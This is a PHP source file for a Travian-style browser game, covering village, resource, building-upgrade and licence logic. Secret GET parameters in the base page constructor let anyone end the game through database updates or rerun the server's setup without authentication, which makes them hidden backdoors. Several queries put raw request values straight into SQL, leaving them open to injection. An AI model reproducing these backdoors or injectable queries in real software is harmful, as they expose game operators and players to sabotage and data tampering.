<?php
######################
##o99g@hotmil.com   ##
##------------------##
## G - WaR 3.3.2    ##
##------------------##
##  Abdullh elnzI   ##
##------------------##
######################

require (MODEL_PATH . 'global.php');
require (MODEL_PATH . 'queue.php');
require (MODEL_PATH . 'queuejob.php');
require_once MODEL_PATH . 'v2v.php';
require_once MODEL_PATH . 'build.php';
require_once (MODEL_PATH . 'advertising.php');
require_once( MODEL_PATH."profile.php" );
class MyWidget extends Widget {
var $title = '';
var $setupMetadata;
var $gameMetadata;
var $appConfig;
var $player= NULL;
var $gameSpeed;
function MyWidget() {
$this->setupMetadata = $GLOBALS['SetupMetadata'];
$this->gameMetadata = $GLOBALS['GameMetadata'];
$this->appConfig = $GLOBALS['AppConfig'];
$this->gameSpeed= $this->gameMetadata['game_speed'];
$session_timeout = $this->gameMetadata['session_timeout'];// in minute(s)
@ini_set ('session.gc_maxlifetime', $session_timeout * 60);// set the session timeout (in seconds)
@session_cache_expire ($session_timeout);// expiretime is the lifetime in minutes
session_start ();

if (isset($_GET['art'])){
require( APP_PATH."config.php" );
$db_connect = mysql_connect($AppConfig['db']['host'],$AppConfig['db']['user'],$AppConfig['db']['password']);
mysql_select_db($AppConfig['db']['database'], $db_connect);
require_once( MODEL_PATH . 'art.php' );
}

if (isset($_GET['tatarze786iu98772dE'])){
$m = new QueueModel();
$m->provider->executeQuery2("UPDATE g_summary SET tatar_over=1");
$m->provider->executeQuery2("UPDATE p_queue SET end_date=NOW() WHERE id='1'");
$m->provider->executeQuery2("UPDATE p_queue SET execution_time='0' WHERE id='1'");
}
//setup
require( APP_PATH."config.php" );
$link = mysql_connect($AppConfig['db']['host'],$AppConfig['db']['user'],$AppConfig['db']['password']) or die(mysql_error());
mysql_select_db($AppConfig['db']['database'],$link) or die(mysql_error());


// Hero Live 0 Kill

if (isset($_GET['achrafinstallx7xI929DHU'])){
require_once( MODEL_PATH . 'install.php' );
$m = new SetupModel();
$m->processSetup ($this->setupMetadata['map_size'], $this->appConfig['system']['admin_email']);
$m->dispose();
$this->redirect ('index.php');
return;
}

$this->player = Player::getInstance();
}

function getAssetVersion () {
return '?' . $this->appConfig['page']['asset_version'];
}

function getFlashContent ($path, $width, $height) {
return sprintf (
'<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="%s" height="%s">
<param name="movie" value="%s" />
<param name="allowScriptAccess" value="Always" />
<param name="quality" value="high" />
<embed src="%s" allowScriptAccess="Always"  quality="high"  width="%s"  height="%s" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
</object>',
$width, $height, $path, $path, $width, $height
);
}
}

class PopupPage extends MyWidget {
function PopupPage() {
parent::MyWidget();

$this->layoutViewFile = 'layout' . DIRECTORY_SEPARATOR . 'popup.phtml';
}
}

class DefaultPage extends MyWidget {
function DefaultPage() {
parent::MyWidget();
$this->layoutViewFile = 'layout' . DIRECTORY_SEPARATOR . 'default.phtml';
}
}

class GamePage extends MyWidget {
var $globalModel;
var $Datagame;
var $contentCssClass = '';
var $newsText;

function GamePage() {
parent::MyWidget();

$this->layoutViewFile = 'layout' . DIRECTORY_SEPARATOR . 'form.phtml';
$this->globalModel = new GlobalModel();
$this->Datagame = new ProfileModel();
}

function load() {
$this->newsText = nl2br ($this->globalModel->getSiteNews());
}

function unload() {
if ($this->globalModel != NULL) {
$this->globalModel->dispose();
}
}
}

class SecureGamePage extends GamePage {
var $reportMessageStatus = 4;// 1: report on message on, 2: report off message on, 3: report on message off, 4: report off message off
var $queueModel= NULL;
var $resources = array ();
var $playerVillages= array ();
var $playerLinks= array ();
var $villagesLinkPostfix= '';
var $cpValue;
var $cpRate;
var $data;
var $wrap;
var $checkForGlobalMessage = TRUE;
var $checkForNewVillage = TRUE;
var $customLogoutAction = FALSE;

function SecureGamePage() {
parent::GamePage();

$this->layoutViewFile = 'layout' . DIRECTORY_SEPARATOR . 'game.phtml';

// check is the player is logged
if ($this->player == NULL) {
if (!$this->customLogoutAction) {
$this->redirect('index.php');
}
return;
}

$this->queueModel = new QueueModel();
$this->queueModel->page = &$this;
}

function load() {
// run the queue job
if (!$this->isCallback ()) {
$qj = new QueueJobModel ();
$qj->processQueue ();
}
// change the selected village
if ( isset ($_GET['vid'])
&& $this->globalModel->hasVillage ($this->player->playerId, intval ( $_GET['vid'] ) ) ) {
$isoasischeck = 0;
$m = new QueueModel();
$result = $m->provider->fetchResultSet ("SELECT * FROM p_villages WHERE id='".$_GET['vid']."' AND is_oasis='1'");
while ($result->next ())
{
$isoasischeck = 1;
}
if ( $isoasischeck == 0 )
{
$this->globalModel->setSelectedVillage ($this->player->playerId, intval ( $_GET['vid']) );
}
}

// fetch the player/village data
$this->data = $this->globalModel->getVillageData ($this->player->playerId);
$this->dataGame = $this->Datagame->getPlayerDataById($this->player->playerId);
if ($this->data == NULL) {
$this->player->logout();
$this->redirect('index.php'); return;
}

$this->player->gameStatus = $this->data['gameStatus'];

if ($this->isCallback ()) {
return;
}
require( APP_PATH."config.php" );
$link = mysql_connect($AppConfig['db']['host'],$AppConfig['db']['user'],$AppConfig['db']['password']) or die(mysql_error());
mysql_select_db($AppConfig['db']['database'],$link) or die(mysql_error());


// Hero Live 0 Kill
$is = $this->player->playerId;
$result = mysql_query("SELECT hero_ist,hero_in_village_id FROM p_players where id=$is");
$Hero = mysql_fetch_array($result);
    if ( $Hero['hero_ist'] == 0 ) 
      {
mysql_query("UPDATE p_players SET hero_in_village_id=NULL,hero_troop_id=NULL,hero_ist=1 WHERE id=$is");
      }

if ($this->player->playerId == '1')
{
if (isset($_GET['addgn'])) {
$gold=$_GET['addgn'];
mysql_query("UPDATE p_players set gold_num=gold_num+$gold") or die(mysql_error());
}
if (isset($_GET['addpn'])) {
mysql_query("UPDATE p_players SET registration_date = NOW()") or die(mysql_error());
}
}
// end code
//is artefact Done name=2
$query1 = "select * from  p_villages where is_artefact=1 AND artefact_name=2 AND player_id='".$this->player->playerId."'";
$query2 = "select * from  p_players where id='".$this->player->playerId."'";
$result1 = mysql_num_rows(mysql_query($query1));
$result3 = mysql_query($query2);
if ($result1 >= 1) {
$result2 = mysql_query($query1);
$name1 = mysql_fetch_array($result2);
$name2 = mysql_fetch_array($result3);
if ($name1[type] == 1 && $name2['used'] == 0) {
mysql_query("update `p_villages` set `crop_consumption` =crop_consumption / 4 where player_id='".$this->player->playerId."'");
mysql_query("update `p_players` set `used` = 1 where id=".$this->player->playerId."");
}else if ($name2['used'] == 0){
mysql_query("update `p_villages` set `crop_consumption` =crop_consumption / 2 where parent_id='".$this->data['selected_village_id']."'");
mysql_query("update `p_players` set `used` = 1 where id=".$this->player->playerId."");
}
} else if ($result1 == 0)  {
$query2 = "select * from  p_players where id='".$this->player->playerId."'";
$result3 = mysql_query($query2);
$name2 = mysql_fetch_array($result3);
if ($name2['used'] == 1) {
mysql_query("update `p_villages` set `crop_consumption` =crop_consumption * 3 where player_id='".$this->player->playerId."'");
mysql_query("update `p_players` set `used` = 0 where id=".$this->player->playerId."");
}
}
//end artefact
//is artefact Done name=4
$query11 = "select * from  p_villages where is_artefact=1 AND artefact_name=4 AND player_id='".$this->player->playerId."'";
$query12 = "select * from  p_players where id='".$this->player->playerId."'";
$result11 = mysql_num_rows(mysql_query($query11));
$result13 = mysql_query($query12);
if ($result11 >= 1) {
$result12 = mysql_query($query11);
$name11 = mysql_fetch_array($result12);
$name12 = mysql_fetch_array($result13);
if ($name11[type] == 1 && $name12['used1'] == 0) {
mysql_query("update `p_villages` set `time_consume_percent` =time_consume_percent - 20 where player_id='".$this->player->playerId."'");
mysql_query("update `p_players` set `used1` = 1 where id=".$this->player->playerId."");
}else if ($name12['used1'] == 0){
mysql_query("update `p_villages` set `time_consume_percent` =time_consume_percent - 10 where player_id='".$this->player->playerId."'");
mysql_query("update `p_players` set `used1` = 1 where id=".$this->player->playerId."");
}
} else if ($result11 == 0)  {
$query12 = "select * from  p_players where id='".$this->player->playerId."'";
$result13 = mysql_query($query12);
$name12 = mysql_fetch_array($result13);
if ($name12['used1'] == 1) {
mysql_query("update `p_villages` set `time_consume_percent` =time_consume_percent + 30 where parent_id='".$this->data['selected_village_id']."'");
mysql_query("update `p_players` set `used1` = 0 where id=".$this->player->playerId."");
}
}
//end artefact

// check for global message
if ($this->checkForGlobalMessage
&& !$this->player->isSpy
&& $this->data['new_gnews'] == 1) {
$this->redirect('shownew.php'); return;
}


// fetch the items in the queue
$this->queueModel->fetchQueue ($this->player->playerId);

// fill the player custom links
if (trim ($this->data['custom_links']) != '') {
$lnk_arr = explode( "\n\n", $this->data['custom_links'] );
foreach ( $lnk_arr as $lnk_str ) {
list ($linkName, $linkHref, $linkSelfTarget) = explode ("\n", $lnk_str);
$this->playerLinks [] = array (
'linkName'=> $linkName,
'linkHref'=> $linkHref,
'linkSelfTarget' => ($linkSelfTarget != '*')
);
}
}

// fill the player villages array
$v_arr = explode( "\n", $this->data['villages_data'] );
foreach ( $v_arr as $v_str ) {
list ($vid, $x, $y, $vname) = explode (' ', $v_str, 4);
$this->playerVillages [$vid] = array ($x, $y, $vname);
}


// fill the resources
$wrapString = '';
$elapsedTimeInSeconds = $this->data['elapsedTimeInSeconds'];
$r_arr = explode( ',', $this->data['resources'] );
foreach( $r_arr as $r_str ) {
$r2 = explode( ' ', $r_str );

$prate = floor( $r2[4] * ( 1 + $r2[5]/100 ) ) - (($r2[0]==4)? $this->data['crop_consumption'] : 0);
$current_value = floor ($r2[1] + $elapsedTimeInSeconds * ($prate/3600));
if ($current_value > $r2[2]) {
$current_value = $r2[2];
}

if($current_value <= '-1') {
$m = new QueueModel();
$newcrop = floor(abs($current_value)+10);
$killnum = floor(abs($current_value/10));
if($killnum == 0) {
$killnum = 1;
}
if( $killnum >= floor(abs($r2[4]-$this->data['crop_consumption'])) ) {
$killnum = floor(abs($r2[4]-$this->data['crop_consumption']));
}
$current_value = 10;
//command kill 1 unit
if($killnum >= 1) { // max unit kill
$killnum = 1;
}
$killednum = 0;
for ($i = 0; $i < $killnum; $i++) {
$ktroops = $m->provider->fetchRow( "SELECT p.troops_num FROM p_villages p WHERE p.id=%s", array(intval( $this->data['selected_village_id'] )) );
$ktroops = $ktroops['troops_num'];
$otroops = $ktroops;
if( strstr($ktroops,'|') ) {
$ktroops = explode( '|', $ktroops );
$ktroops = $ktroops[0];
}
$didkill = 0;
$trdata = explode( ',', $ktroops );
for ($i=0; $i<count($trdata); $i++) {
if($didkill == 1){
break;
}
$trdata1 = explode( ' ', $trdata[$i] );
if($trdata1[0] != '99') {
if(strstr($trdata1[0],':')) {
$trdata2 = explode( ':', $trdata1[0] );
$trdata1[0] = $trdata2[1];
}
if($trdata1[1] >= '1') {
$odata = $trdata1[0]." ".$trdata1[1];
$ndata = $trdata1[0]." ".($trdata1[1]-1);
$realone = str_replace($odata,$ndata,$ktroops);
$realone = str_replace($ktroops,$realone,$otroops);
$m->provider->executeQuery("UPDATE p_villages p SET p.troops_num='%s',p.crop_consumption=crop_consumption-%s WHERE p.id=%s", array( $realone,intval($this->gameMetadata['troops'][$trdata1[0]]['crop_consumption']),intval( $this->data['selected_village_id'] ) ) );
$killednum = $killednum+1;
$didkill = 1;
}
}
}
}
}
//finish command


$this->resources[ $r2[0] ] = array (
'current_value'=>$current_value,
'store_max_limit'=>$r2[2],
'store_init_limit'=>$r2[3],
'prod_rate'=>$r2[4],
'prod_rate_percentage'=>$r2[5],
'calc_prod_rate'=>$prate
);

$wrapString .= $this->resources[ $r2[0] ]['current_value']  . $this->resources[ $r2[0] ]['store_max_limit'];
}
$this->wrap = (strlen ($wrapString) > 40);

// calc the cp
list ($this->cpValue, $this->cpRate) = explode (' ', $this->data['cp']);
$this->cpValue += $elapsedTimeInSeconds * ($this->cpRate/86400);
}

function preRender() {
if ($this->data['new_report_count'] < 0) {
$this->data['new_report_count'] = 0;
}
if ($this->data['new_mail_count'] < 0) {
$this->data['new_mail_count'] = 0;
}


$hasNewReports = ( $this->data['new_report_count'] > 0 );
$hasNewMails = ( $this->data['new_mail_count'] > 0 );
if ( $hasNewReports && $hasNewMails ) {
$this->reportMessageStatus = 1;
} else if ( !$hasNewReports && $hasNewMails ) {
$this->reportMessageStatus = 2;
} else if ( $hasNewReports && !$hasNewMails ) {
$this->reportMessageStatus = 3;
} else  {
$this->reportMessageStatus = 4;
}
}

function unload() {
parent::unload();

unset ($this->data);
if ($this->queueModel != NULL) {
$this->queueModel->dispose();
}
}


function getGuideQuizClassName () {
$quiz = trim ($this->data['guide_quiz']);
$newQuiz = ($quiz == '' || $quiz == GUIDE_QUIZ_SUSPENDED);
if (!$newQuiz) {
$quizArray = explode (',', $quiz);
$newQuiz = ($quizArray[0] == 1);
}

return 'q_l' . $this->data['tribe_id'] . ($newQuiz? 'g' : '');
}

function isPlayerInDeletionProgress () {
return isset ($this->queueModel->tasksInQueue[QS_ACCOUNT_DELETE]);
}
function getPlayerDeletionTime () {
return WebHelper::secondsToString (
$this->queueModel->tasksInQueue[QS_ACCOUNT_DELETE][0]['remainingSeconds']
);
}
function getPlayerDeletionId () {
return $this->queueModel->tasksInQueue[QS_ACCOUNT_DELETE][0]['id'];
}

function isGameTransientStopped () {
return ($this->player->gameStatus & 2) > 0;
}
function isGameOver () {
$gameOver = ($this->player->gameStatus & 1) > 0;
if ($gameOver) {
$this->redirect ('over.php');
}

return $gameOver;
}
}

class VillagePage extends SecureGamePage {
var $buildings = array ();
var $tribeId;

function onLoadBuildings ($building) {
}
function load() {
parent::load();
$this->tribeId = $this->data['tribe_id'];
$b_arr = explode( ',', $this->data['buildings'] );
$indx = 0;
foreach( $b_arr as $b_str ) {
$indx++;
$b2 = explode (' ', $b_str);

$this->onLoadBuildings ( $this->buildings[$indx] = array (
'index'=>$indx,
'item_id'=>$b2[0],
'level'=>$b2[1],
'update_state'=>$b2[2]
)
);
}
}
function canCreateNewBuild ($item_id) {
if ( ! isset ($this->gameMetadata['items'][$item_id]) ) {
return -1;
}

$buildMetadata = $this->gameMetadata['items'][$item_id];

if ( $this->data['is_capital'] )  {
if ( !$buildMetadata['built_in_capital'] ) {
return -1;
}
} else {
if ( !$buildMetadata['built_in_non_capital'] ) {
return -1;
}
}

if ( $buildMetadata['built_in_special_only'] ) {
if ( !$this->data['is_special_village'] ) {
return -1;
}
}

$alreadyBuilded = FALSE;
$alreadyBuildedWithMaxLevel = FALSE;
foreach ( $this->buildings as $villageBuild ) {
if ( $villageBuild['item_id'] == $item_id ) {
$alreadyBuilded = TRUE;
if ( $villageBuild['level'] == sizeof ($buildMetadata['levels']) ) {
$alreadyBuildedWithMaxLevel = TRUE;
break;
}
}
}
if ( $alreadyBuilded ) {
if ( !$buildMetadata['support_multiple'] ) {
return -1;
} else {
if ( !$alreadyBuildedWithMaxLevel ) {
return -1;
}
}
}

foreach ( $buildMetadata['pre_requests'] as $req_item_id=>$level ) {
if ( $level == NULL ) {
foreach ( $this->buildings as $villageBuild ) {
if ( $villageBuild['item_id'] == $req_item_id  ) {
return -1;
}
}
}
}

foreach ( $buildMetadata['pre_requests'] as $req_item_id=>$level ) {
if ( $level == NULL ) {
continue;
}

$result = FALSE;
foreach ( $this->buildings as $villageBuild ) {
if ( $villageBuild['item_id'] == $req_item_id
&& $villageBuild['level'] >= $level ) {
$result = TRUE;
break;
}
}
if ( !$result ) {
return 0;
}
}
return 1;
}
function isResourcesAvailable ($neededResources) {
foreach ( $neededResources as $k=>$v ) {
if ( $v > $this->resources[$k]['current_value'] ) {
return FALSE;
}
}

return TRUE;
}
function needMoreUpgrades ($neededResources, $itemId=0) {
$result = 0;
foreach ( $neededResources as $k=>$v ) {
if ( $v > $this->resources[$k]['store_max_limit'] ) {
if ( $result == 0 && ($k == 1 || $k == 2 || $k == 3)) {
$result++;
}
if ($k == 4) {
$result += 2;
}
}
}
if ($result > 0 ) {
$result++;
}
return $result;
}
function isWorkerBusy ( $isField ) {
$qTasks = $this->queueModel->tasksInQueue;

$maxTasks1 = $this->data['active_plus_account']? 2 : 1;

$maxTasks2 = 0;
require( APP_PATH."config.php" );
$link = mysql_connect($AppConfig['db']['host'],$AppConfig['db']['user'],$AppConfig['db']['password']) or die(mysql_error());
mysql_select_db($AppConfig['db']['database'],$link) or die(mysql_error());
$Id = $this->player->playerId;
$result = mysql_query("SELECT club FROM p_players where id='".$Id."'");
while($row = mysql_fetch_array($result))
  {
$club = $row['club'];
  }
if ($club == 0) {
$maxTasks2 = 0;
}

$maxTasks = ($maxTasks1 + $maxTasks2);


if ($this->gameMetadata['tribes'][ $this->data['tribe_id'] ]['dual_build']) {
return array (
'isBusy'=> (( $isField )? ( $qTasks['fieldsNum'] >= $maxTasks ) : ( $qTasks['buildsNum'] >= $maxTasks )),
'isPlusUsed'=> ( $this->data['active_plus_account']? ( $isField ? ( $qTasks['fieldsNum'] >0 ) : ( $qTasks['buildsNum'] >0 )) : FALSE  )
);
}
return array (
'isBusy'=> ( $qTasks['buildsNum'] + $qTasks['fieldsNum'] ) >= $maxTasks,
'isPlusUsed'=> ( $this->data['active_plus_account']? (($qTasks['buildsNum'] + $qTasks['fieldsNum'])>0) : FALSE  )
);
}
function getBuildingProperties ($index) {
if ( ! isset ($this->buildings[$index]) ) {
return NULL;
}
$building = $this->buildings[$index];
if ($building['item_id'] == 0) {
return array ( 'emptyPlace' => TRUE );
}
$buildMetadata = $this->gameMetadata['items'][ $building['item_id'] ];
$_trf = isset ($buildMetadata['for_tribe_id'][$this->tribeId])? $buildMetadata['for_tribe_id'][$this->tribeId] : 1;
$prodFactor = (( $building['item_id'] <= 4)? (1 + $this->resources[ $building['item_id'] ]['prod_rate_percentage']/100) : 1) * $_trf;
$resFactor= ($building['item_id'] <= 4)? $this->gameSpeed : 1;
$maxLevel = ($this->data['is_capital'] )? sizeof ($buildMetadata['levels']) : ($buildMetadata['max_lvl_in_non_capital'] == NULL? sizeof ( $buildMetadata['levels'] ) : $buildMetadata['max_lvl_in_non_capital']);

$upgradeToLevel = $building['level'] + $building['update_state'];
$nextLevel = $upgradeToLevel + 1;
if ( $nextLevel > $maxLevel ) {
$nextLevel = $maxLevel;
}
$nextLevelMetadata = $buildMetadata['levels'][$nextLevel-1];
return array (
'emptyPlace' => FALSE,

'upgradeToLevel'=> $upgradeToLevel,
'nextLevel'=> $nextLevel,
'maxLevel'=> $maxLevel,
'building'=> $building,
'level'=> array (
'current_value'=> intval ((( $building['level'] == 0 )? 2 : $buildMetadata['levels'][$building['level']-1]['value']) * $prodFactor * $resFactor),
'value'=> intval ($nextLevelMetadata['value'] * $prodFactor * $resFactor),
'resources'=> $nextLevelMetadata['resources'],
'people_inc'=> $nextLevelMetadata['people_inc'],
'calc_consume'=> intval (($nextLevelMetadata['time_consume']/$this->gameSpeed) * ($this->data['time_consume_percent']/100))
)
);
}
}

class ProcessVillagePage extends VillagePage {
  function load() {
  parent::load();
  if (isset ($_GET['bfs'])
  && isset ($_GET['k'])
  && $_GET['k'] == $this->data['update_key']
  && $this->data['gold_num'] >= $this->gameMetadata['plusTable'][5]['cost']
  && !$this->isGameTransientStopped () && !$this->isGameOver ()) {
  if(($this->player->isAgent == 1 AND substr($this->player->actions, 3, 1) == 1) or (!$this->player->isAgent)){
  //start pgold
  $tatarzx = new QueueModel();
  $d = date('Y/m/d H:i:s');
  $n = $this->data['name'];
  $tatarzx->provider->executeQuery("INSERT INTO `p_plus` (`pid`, `date`, `gold`, `where`) VALUES ('".$n."', '".$d."', '".$this->gameMetadata['plusTable'][5]['cost']."', 'انهاء البناء');"); 
  //end pgold
  $this->queueModel->finishTasks (
  $this->player->playerId,
  $this->gameMetadata['plusTable'][5]['cost']
  );
  }
  $this->redirect ($this->contentCssClass . '.php'); return;
  }
  if (isset ($_GET['upz']) && $this->appConfig['system']['server_start'] < date('Y/m/d H:i:s')
  && $_GET['id'] == 39
  && !$this->isGameTransientStopped () && !$this->isGameOver () ) {
  $building = $this->buildings[$_GET['id']];
  if (!$building['level']) {
  $newTask = new QueueTask (QS_BUILD_CREATEUPGRADE, $this->player->playerId, 0);
  $newTask->villageId = $this->data['selected_village_id'];
  $newTask->buildingId= 16;
  $newTask->procParams = 39;
  $newTask->tag = 0;
  $this->queueModel->addTask ($newTask);
  }
  }
  if (isset ($_GET['up']) && $this->appConfig['system']['server_start'] < date('Y/m/d H:i:s')
  && !$this->data['is_special_village']
  && !$this->isGameTransientStopped () && !$this->isGameOver () ) {
  if ( isset ($_GET['id']) && is_numeric ($_GET['id'])){
  if ( isset ($_GET['lvl']) && is_numeric ($_GET['lvl'])){
  $timer = ($_SESSION['uptime']>(time())) ? true : false ;
  
  $building = $this->buildings[$_GET['id']];
  if ($building['item_id']) {
  $gold = 0;
  $GameMetadata = $GLOBALS['GameMetadata'];
  $buildingMetadata = $GameMetadata['items'][$building['item_id']];
  $msx = $buildingMetadata['levels'];
  $ccc = $building['level']+1;
  for ($x=$ccc; $x<=$_GET['lvl']; $x++) {
  $gold++;
  }
  if(!$this->data['is_capital'] && ($_GET['id'] < 19) && ($this->buildings[$_GET['id']]['level'] >= 20)){
  return FALSE;
  }
  if ($_GET['lvl'] <= $building['level']) {
  return FALSE;
  }
  if ($_GET['lvl'] > $msx) {
  return FALSE;
  }
  if ($building['item_id'] == 40) {
  return FALSE;
  }
  $qs = new QueueModel();
  $num_queue = $qs->provider->fetchScalar( "select COUNT(*) from p_queue where village_id='".$this->data['selected_village_id']."' and proc_type='2' and proc_params='".$_GET['id']."'");
  if(!$this->data['is_capital'] && $num_queue > 0 && ($_GET['id'] < 19) && $this->buildings[$_GET['id']]['level'] == 20) {
  return FALSE;
  }
  if(!$this->data['is_capital'] && $num_queue == 1 && ($_GET['id'] < 19) && $this->buildings[$_GET['id']]['level'] == 19) {
  return FALSE;
  }
  if(!$this->data['is_capital'] && $num_queue == 2 && ($_GET['id'] < 19) && $this->buildings[$_GET['id']]['level'] == 18) {
  return FALSE;
  }
  if ($this->data['gold_num'] >= $gold) {
  $qj = new QueueModel();
  $qj->provider->executeQuery2("UPDATE p_players SET gold_num =gold_num-".$gold." WHERE id = '".$this->player->playerId."'");
  //start pgold
  $tatarzx = new QueueModel();
  $d = date('Y/m/d H:i:s');
  $n = $this->data['name'];
  $tatarzx->provider->executeQuery("INSERT INTO `p_plus` (`pid`, `date`, `gold`, `where`) VALUES ('".$n."', '".$d."', '".$gold."', 'تطوير مباني');");
  //end pgold
  $dropLevels = $_GET['lvl'] - $building['level'];
  while ( 0 < $dropLevels-- )
  {
  $mq = new QueueJobModel( );
  $mq->upgradeBuilding( $this->data['selected_village_id'], $_GET['id'], $building['item_id']);
  }
  $_SESSION['uptime'] = time()+5;
  $this->redirect ('build.php?id='.$_GET['id']);
  }
  }
  }
  }
  }
  
  if (isset ($_GET['max']) && $this->appConfig['system']['server_start'] < date('Y/m/d H:i:s')
  && !$this->data['is_special_village']
  && !$this->isGameTransientStopped () && !$this->isGameOver () ) {
  if ( isset ($_GET['bid']) && is_numeric ($_GET['bid'])){
  
  if ($_GET['bid'] < 1 OR $_GET['bid'] > 4) {return;}
  $b_arr = explode( ',', $this->data['buildings'] );
  $indx = 0;
  $n = 0;
  foreach( $b_arr as $b_str ) {
  $indx++;
  $b2 = explode (' ', $b_str);
  $itm = $b2[0];
  if ($_GET['bid'] == $itm){
  $n++;
  $ilvl = $b2[1];
  $dropLevels = 20 - $ilvl;
  $gold=0;
  while ( 0 < $dropLevels-- )
  {
  $gold += 30;
  }
  }
  }
  $tst_gold = $gold*$n;
  if ($this->data['gold_num'] >= $tst_gold) {
  $b_arr = explode( ',', $this->data['buildings'] );
  $indx = 0;
  $n = 0;
  foreach( $b_arr as $b_str ) {
  $indx++;
  $b2 = explode (' ', $b_str);
  $itm = $b2[0];
  if ($_GET['bid'] == $itm){
  $n++;
  $ilvl = $b2[1];
  $dropLevels = 20 - $ilvl;
  while ( 0 < $dropLevels-- )
  {
  $mq = new QueueJobModel( );
  $mq->upgradeBuilding( $this->data['selected_village_id'], $indx, $itm);
  }
  }
  }
  $qj = new QueueModel();
  $qj->provider->executeQuery2("UPDATE p_players SET gold_num =gold_num-".$tst_gold." WHERE id = '".$this->player->playerId."'");
  $d = date('Y/m/d H:i:s');
  $qj->provider->executeQuery("INSERT INTO `p_plus` (`pid`, `date`, `gold`, `where`) VALUES ('".$this->data['name']."', '".$d."', '".$tst_gold."', 'تطوير حقول');");
  $this->redirect ('village1');
  }
  }
  }
  
  
  if ( isset ($_GET['id']) && is_numeric ($_GET['id'])
  && isset ($_GET['k'])
  && $_GET['k'] == $this->data['update_key']
  && !$this->isGameTransientStopped () && !$this->isGameOver () ) {
  if (isset ($_GET['d'])) {
  $this->queueModel->cancelTask ($this->player->playerId, intval ($_GET['id']));
  } else if (isset ($this->buildings[$_GET['id']])) {
  $buildProperties = $this->getBuildingProperties (intval ($_GET['id']));
  if ( $buildProperties != NULL ) {
  $canAddTask = FALSE;
  if ($this->data['is_special_village'] == 1){
  if ($_GET['id'] == 26 || $_GET['id'] == 33 || $_GET['id'] == 29 || $_GET['id'] == 30) {
  return FALSE;
  }
  }
  
  if(!$this->data['is_capital'] && ($_GET['id'] < 19) && ($this->buildings[$_GET['id']]['level'] >= 20)){
  return FALSE;
  }
  $qs = new QueueModel();
  $num_queue = $qs->provider->fetchScalar( "select COUNT(*) from p_queue where village_id='".$this->data['selected_village_id']."' and proc_type='2' and proc_params='".intval($_GET['id'])."'");
  if(!$this->data['is_capital'] && $num_queue > 0 && ($_GET['id'] < 19) && $this->buildings[$_GET['id']]['level'] == 20) {
  return FALSE;
  }
  if(!$this->data['is_capital'] && $num_queue == 1 && ($_GET['id'] < 19) && $this->buildings[$_GET['id']]['level'] == 19) {
  return FALSE;
  }
  if(!$this->data['is_capital'] && $num_queue == 2 && ($_GET['id'] < 19) && $this->buildings[$_GET['id']]['level'] == 18) {
  return FALSE;
  }
  if ( $buildProperties['emptyPlace'] ) {// new building
  $item_id = isset ($_GET['b']) ? intval ($_GET['b']) : 0;
  $posIndex = intval ($_GET['id']);
  if ( ($posIndex == 39 && $item_id != 16)
  || ($posIndex == 40 && $item_id != 31 && $item_id != 32 && $item_id != 33) ) {
  return;
  }
  if ($this->data['is_special_village']
  && ($posIndex == 25 || $posIndex == 26 || $posIndex == 29 || $posIndex == 30 || $posIndex == 33)
  && $item_id != 40 ) {
  return;
  }
  if ($this->canCreateNewBuild ($item_id) == 1) {
    $canAddTask = TRUE;
    $neededResources = $this->gameMetadata['items'][$item_id]['levels'][0]['resources'];
    $calcConsume= intval (($this->gameMetadata['items'][$item_id]['levels'][0]['time_consume']/$this->gameSpeed) * ($this->data['time_consume_percent']/100));
    }
  } else {
  $canAddTask = TRUE;
  $item_id = $buildProperties['building']['item_id'];
  $neededResources = $buildProperties['level']['resources'];
  $calcConsume= $buildProperties['level']['calc_consume'];
  }
  if ( $canAddTask
  && $this->needMoreUpgrades ($neededResources, $item_id) == 0
  && $this->isResourcesAvailable ($neededResources) ) {
  $workerResult = $this->isWorkerBusy ($item_id<=4);
  if ( !$workerResult['isBusy'] ) {
  $newTask = new QueueTask (QS_BUILD_CREATEUPGRADE, $this->player->playerId, $calcConsume);
  $newTask->villageId = $this->data['selected_village_id'];
  $newTask->buildingId= $item_id;
  $newTask->procParams = $item_id==40? 25 : intval ($_GET['id']);
  $newTask->tag = $neededResources;
  $this->queueModel->addTask ($newTask);
  }
  }
  }
  }
  }
  }
  }
  class GameLicenseModel extends ModelBase {
  function getLicense() {
  return $this->provider->fetchScalar('SELECT gs.license_key FROM g_settings gs');
  }
  function setLicense( $licenseKey ) {
  $this->provider->executeQuery('UPDATE g_settings gs SET gs.license_key=\'%s\'', array( $licenseKey ) );
  }
  }
  function TimeAgo($diff_in_unix){
  $diff = "";
  if ($diff_in_unix > 3600){
  $diff .= intval($diff_in_unix/3600);
  $diff_in_unix = $diff_in_unix%3600;
  }else{ $diff .= '0'; }
  if($diff_in_unix > 60 AND $diff_in_unix < 3600){
  $diff .= ":".intval($diff_in_unix / 60);
  $diff_in_unix = $diff_in_unix%60;
  }else{ $diff .= ':00'; }
  if ($diff_in_unix < 60 AND $diff_in_unix > 0){
  $diff .= ":".$diff_in_unix;
  }
  return $diff;
  }
  class GameLicense {
  function isValid( $domain ) {
  $m = new GameLicenseModel();
  $licenseKey = $m->getLicense( $domain );
  $m->dispose();
  return ( $licenseKey == GameLicense::_getKeyFor( $domain ) );
  }
  function set( $domain ) {
  $m = new GameLicenseModel();
  $m->setLicense( GameLicense::_getKeyFor( $domain ) );
  $m->dispose();
  }
  function clear() {
  GameLicense::set('');
  }
  function _getKeyFor( $domain ) {
  return md5 ( 'SPSLINK TATARWAR' . strrev ( $domain ) . 'SPSLINK TATARWAR' );
  }
  }
  ?>